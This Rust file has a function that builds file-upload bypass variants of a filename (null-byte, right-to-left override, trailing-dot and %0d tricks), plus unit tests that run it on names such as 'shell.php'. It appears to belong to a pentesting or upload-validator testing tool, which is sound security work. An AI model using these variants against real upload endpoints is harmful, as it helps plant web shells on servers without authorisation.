pub fn generate_variants(filename: &str) -> Vec<String> {
    vec![
        filename.to_string(),
        format!("{}%00.jpg", filename),
        format!("{}\x00.jpg", filename),
        format!("{}.jpg", filename),
        format!("{}\u{202e}jpg", filename),
        format!("{}....", filename),
        format!("{}%0d.jpg", filename),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn returns_exactly_seven_variants() {
        let variants = generate_variants("shell.php");
        assert_eq!(variants.len(), 7, "expected 7 filename bypass variants");
    }

    #[test]
    fn first_variant_is_original_filename() {
        let variants = generate_variants("shell.php");
        assert_eq!(&variants[0], "shell.php", "first variant must be the original");
    }

    #[test]
    fn null_byte_percent_encoded_variant() {
        let variants = generate_variants("shell.php");
        assert!(
            variants.iter().any(|v| v.contains("%00")),
            "must include %00 null-byte variant"
        );
    }

    #[test]
    fn null_byte_raw_variant() {
        let variants = generate_variants("shell.php");
        assert!(
            variants.iter().any(|v| v.contains('\x00')),
            "must include raw null-byte variant"
        );
    }

    #[test]
    fn rtlo_unicode_variant() {
        // U+202E RIGHT-TO-LEFT OVERRIDE flips the display of the extension.
        let variants = generate_variants("shell.php");
        assert!(
            variants.iter().any(|v| v.contains('\u{202e}')),
            "must include RTLO (U+202E) variant"
        );
    }

    #[test]
    fn windows_trailing_dots_variant() {
        let variants = generate_variants("shell.php");
        assert!(
            variants.iter().any(|v| v.ends_with("....")),
            "must include trailing-dots variant (Windows extension stripping)"
        );
    }

    #[test]
    fn empty_filename_produces_non_empty_variants() {
        // Even an empty filename must not produce panics or empty vec.
        let variants = generate_variants("");
        assert_eq!(variants.len(), 7);
    }

    #[test]
    fn all_variants_contain_original_stem() {
        // Every variant must contain the original filename as a prefix
        // (the bypass appends or modifies the tail, never strips the stem).
        let name = "evil.php";
        let variants = generate_variants(name);
        for v in &variants {
            assert!(
                v.starts_with(name),
                "variant {v:?} must start with original filename {name:?}"
            );
        }
    }
}
